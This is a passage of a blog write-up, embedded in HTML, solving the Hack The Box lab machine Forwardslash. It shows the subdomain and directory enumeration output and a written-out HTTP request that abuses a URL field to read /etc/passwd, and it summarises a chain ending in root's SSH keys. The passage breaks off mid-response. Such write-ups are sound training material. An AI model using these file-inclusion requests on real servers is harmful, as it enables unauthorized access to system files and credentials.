@@ -1,0 +1,1165 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Finding a new subdomain and a tricky lfi using php Wrapper and getting a users creds , Abusing a suid that is somehow linked to another file . Got user and analyzing a python script and getting password to mount images and got ssh-keys for root" /><meta property="og:title" content="Hackthebox Forwardslash writeup" /><meta property="og:description" content="Finding a new subdomain and a tricky lfi using php Wrapper and getting a users creds , Abusing a suid that is somehow linked to another file . Got user and analyzing a python script and getting password to mount images and got ssh-keys for root" /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/forwardslash/forwardslash.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Forwardslash writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Finding a new subdomain and a tricky lfi using php Wrapper and getting a users creds , Abusing a suid that is somehow linked to another file . Got user and analyzing a python script and getting password to mount images and got ssh-keys for root"><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/forwardslash/forwardslash.png"><title>Hackthebox Forwardslash writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Forwardslash writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Forwardslash writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 5, 2020, 12:00 AM +0800" > Apr 5 <i class="unloaded">2020-04-05T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/forwardslash/forwardslash.png" class="post-preview-img"><h1 id="introductionforwardslash">Introduction@forwardslash:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>forwardslash<tr><td>IP<td>10.10.10.183<tr><td>Points<td>40<tr><td>Os<td>Linux<tr><td>Difficulty<td>Hard<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/52045" target="_blank">InfoSecJack</a> and <a href="https://www.hackthebox.eu/home/users/profile/44614" target="_blank">Chivato</a><tr><td>Out On<td>4 April 2020</table></div><h1 id="briefforwardslash">Brief@forwardslash:~$</h1><p>The journey of the Machine <code class="language-plaintext highlighter-rouge">Forwardslash</code> starts with finding a <code class="language-plaintext highlighter-rouge">subdomain</code>.And then a lfi by using php <code class="language-plaintext highlighter-rouge">Wrapper</code> do all the work for us , and <strong>inclusion</strong> of a file that is forbidden for us.The file has credentials for user.A suid is owned by user <code class="language-plaintext highlighter-rouge">pain</code> and which is generating md5sum of timestamp and if we run the <code class="language-plaintext highlighter-rouge">config.php.bak</code> with that timestamp we got pain user <code class="language-plaintext highlighter-rouge">credentials</code>.Getting the key after analyzing the python script.User pain can <code class="language-plaintext highlighter-rouge">mount</code> images with privilege of root and hence we got <strong>private</strong> ssh keys of user <strong>root</strong>.</p><h1 id="summary">Summary</h1><ul><li>Finding the SubDomain using <code class="language-plaintext highlighter-rouge">wfuzz</code><li>Testing for <strong>Local File Inclusion</strong><li>Using php <code class="language-plaintext highlighter-rouge">wrapper</code> to extract the forbidden <code class="language-plaintext highlighter-rouge">/dev </code>dir content<li>Login as <strong>Chiv</strong><li>After analyzing the suid binary <code class="language-plaintext highlighter-rouge">backup</code> and <code class="language-plaintext highlighter-rouge">config.php.bak</code> getting pain credentials<li>Login as <strong>Pain</strong><li>Got <code class="language-plaintext highlighter-rouge">User.txt</code><li>Analyzing the python script from the dir <strong>encryptorinator</strong><li>Getting the <strong>key</strong> from the script.<li>User <code class="language-plaintext highlighter-rouge">pain</code> may run some command as <code class="language-plaintext highlighter-rouge">sudo</code>.<li><strong>Mounting</strong> the Images to <strong>~/mnt</strong> after using that key.<li>Login as <code class="language-plaintext highlighter-rouge">Root</code><li>Got <strong>root.txt</strong></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/forwardslash/fc3efc98-2e39-4362-a947-742f099ec8fc/forwardslash.cast" start-at="0" autoplay="1.5" speed="2" loop="1" cols="150" rows="30"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>➜  forwardslash nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-oA</span> nmap.full forwardslash.htb
+<span class="c"># Nmap 7.80 scan initiated Thu Apr  9 15:20:58 2020 as: nmap -sV -sC -T4 -p- -oA nmap.full forwardslash.htb</span>
+Nmap scan report <span class="k">for </span>forwardslash.htb <span class="o">(</span>10.10.10.183<span class="o">)</span>
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf <span class="o">(</span>RSA<span class="o">)</span>
+|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Backslash Gang
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Thu Apr  9 15:33:12 2020 -- 1 IP address (1 host up) scanned in 734.16 seconds</span>
+➜  forwardslash 
+</pre></table></code></div></div><p>Only Two ports are opened <code class="language-plaintext highlighter-rouge">80:http</code>and <code class="language-plaintext highlighter-rouge">22:ssh</code>.So for sure we need to start from port 80.</p><h2 id="port-80-">Port 80 –</h2><p>It has a fancy web page saying that its been hacked!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/forwardslash/fc3efc98-2e39-4362-a947-742f099ec8fc/image-1.png" alt="port-80" /></p><p>Running Gobuster doesnt show me anything useful.So i tried to enumerate subdomain.</p><h2 id="wfuzz-for-finding-subdomain">Wfuzz For finding subdomain</h2><ul><li>–hh = for hinding the result which has <code class="language-plaintext highlighter-rouge">content length 0</code><li>–hc = for hiding result which have response <strong>400</strong><li>-c = for making the result <code class="language-plaintext highlighter-rouge">colorful</code></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>➜  forwardslash wfuzz  <span class="nt">--hh</span> 0  <span class="nt">-H</span> <span class="s1">'Host: FUZZ.forwardslash.htb'</span> <span class="nt">-u</span> http://10.10.10.183/ <span class="nt">--hc</span> 400 <span class="nt">-w</span> /usr/share/wordlists/wfuzz/general/common.txt <span class="nt">-c</span>
+
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s'</span> documentation <span class="k">for </span>more information.
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 2.4 - The Web Fuzzer                           <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://10.10.10.183/
+Total requests: 949
+
+<span class="o">===================================================================</span>
+ID           Response   Lines    Word     Chars       Payload                                                                              
+<span class="o">===================================================================</span>
+
+000000088:   302        0 L      6 W      33 Ch       <span class="s2">"backup"</span>                                                                             
+
+Total <span class="nb">time</span>: 35.30510
+Processed Requests: 949
+Filtered Requests: 948
+Requests/sec.: 26.87996
+</pre></table></code></div></div><p>Here we got a subdomain backup the final result will be <code class="language-plaintext highlighter-rouge">backup.forwardslash.htb</code>, I added it to /etc/hosts file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>➜  forwardslash <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"10.10.10.183</span><span class="se">\t</span><span class="s2">backup.forwardslash.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</pre></table></code></div></div><p>Now i ran <code class="language-plaintext highlighter-rouge">gobuster</code> on the initial page of the subdomain.</p><h2 id="gobuster">Gobuster</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>➜  forwardslash gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-r</span> <span class="nt">-k</span>   <span class="nt">-x</span> <span class="s2">"txt,html,php,asp,aspx,jpg"</span> <span class="nt">-u</span> http://backup.forwardslash.htb/ <span class="nt">-o</span> gobuster-result 
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://backup.forwardslash.htb/
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     php,asp,aspx,jpg,txt,html
+<span class="o">[</span>+] Follow Redir:   <span class="nb">true</span>
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/04/21 10:27:17 Starting gobuster
+<span class="o">===============================================================</span>
+/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/login.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/register.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/welcome.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/dev <span class="o">(</span>Status: 403<span class="o">)</span>
+/api.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/environment.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/logout.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/config.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/hof.php <span class="o">(</span>Status: 200<span class="o">)</span>
+</pre></table></code></div></div><p>There are so many file some with <code class="language-plaintext highlighter-rouge">200</code> and <code class="language-plaintext highlighter-rouge">/dev</code> dir has a 403 response.</p><p>Lets browse it on browser.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/forwardslash/fc3efc98-2e39-4362-a947-742f099ec8fc/image-2.png" alt="Login page" /></p><p>It has a <code class="language-plaintext highlighter-rouge">login</code> <strong>page</strong> and we can sign up there too as there is a sign up option.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/forwardslash/fc3efc98-2e39-4362-a947-742f099ec8fc/image-3.png" alt="signup page" /></p><p>i Signed up there easily. And now i can login simply to check whats inside it.</p><p>There is a <code class="language-plaintext highlighter-rouge">welcome</code> page and some of the options we saw on the gobuster result.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/forwardslash/fc3efc98-2e39-4362-a947-742f099ec8fc/image-4.png" alt="Welcome page" /></p><h1 id="local-file-inclusion">Local File Inclusion</h1><p>There is a <code class="language-plaintext highlighter-rouge">/profilepicture.php</code> where the <code class="language-plaintext highlighter-rouge">input</code> and <code class="language-plaintext highlighter-rouge">submit</code> option . We can enable the disabled attributes by <strong>inspect-element</strong>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/forwardslash/fc3efc98-2e39-4362-a947-742f099ec8fc/image-5.png" alt="Editing-html attribute" /></p><p>I just enter a <code class="language-plaintext highlighter-rouge">test</code> value in the input field and <strong>intercept</strong> the request using <code class="language-plaintext highlighter-rouge">burp</code> for hit and <code class="language-plaintext highlighter-rouge">trials</code>.Send it to <code class="language-plaintext highlighter-rouge">Repeater</code>.</p><p>it send a image url to test that what will be the result.The request was the following.</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/profilepicture.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">backup.forwardslash.htb</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">83</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://backup.forwardslash.htb</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://backup.forwardslash.htb/profilepicture.php</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=l1nm05k0co9fmed61jnud97usg</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+url=https://raw.githubusercontent.com/0xprashant/hackthebox-images/master/magic.png
+</pre></table></code></div></div><p>And the <code class="language-plaintext highlighter-rouge">response</code> was</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 21 Apr 2020 11:07:14 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">689</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Welcome<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"bootstrap.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
+        <span class="nt">body</span><span class="p">{</span> <span class="nl">font</span><span class="p">:</span> <span class="m">14px</span> <span class="nb">sans-serif</span><span class="p">;</span> <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span> <span class="p">}</span>
+    <span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"page-header"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h1&gt;</span>Change your Profile Picture!<span class="nt">&lt;/h1&gt;</span>
+	<span class="nt">&lt;font</span> <span class="na">style=</span><span class="s">"color:red"</span><span class="nt">&gt;</span>This has all been disabled while we try to get back on our feet after the hack.<span class="nt">&lt;br&gt;&lt;b&gt;</span>-Pain<span class="nt">&lt;/b&gt;&lt;/font&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/profilepicture.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+        URL:
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"url"</span> <span class="na">disabled</span> <span class="na">style=</span><span class="s">"width:600px"</span><span class="nt">&gt;&lt;br&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">style=</span><span class="s">"width:200px"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span> <span class="na">disabled</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></table></code></div></div><p>Basically it was nothing the page didnt do somehting</p><h2 id="testing-lfi">Testing LFI</h2><p>I send the <code class="language-plaintext highlighter-rouge">file:///etc/passwd</code> in the url parameter and the <code class="language-plaintext highlighter-rouge">request</code> is following</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/profilepicture.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">backup.forwardslash.htb</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">22</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://backup.forwardslash.htb</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://backup.forwardslash.htb/profilepicture.php</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=l1nm05k0co9fmed61jnud97usg</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+url=file:///etc/passwd
+</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">response</code> is the following that i got</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 21 Apr 2020 11:08:35 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">2349</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Welcome<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"bootstrap.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
+        <span class="nt">body</span><span class="p">{</span> <span class="nl">font</span><span class="p">:</span> <span class="m">14px</span> <span class="nb">sans-serif</span><span class="p">;</span> <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span> <span class="p">}</span>
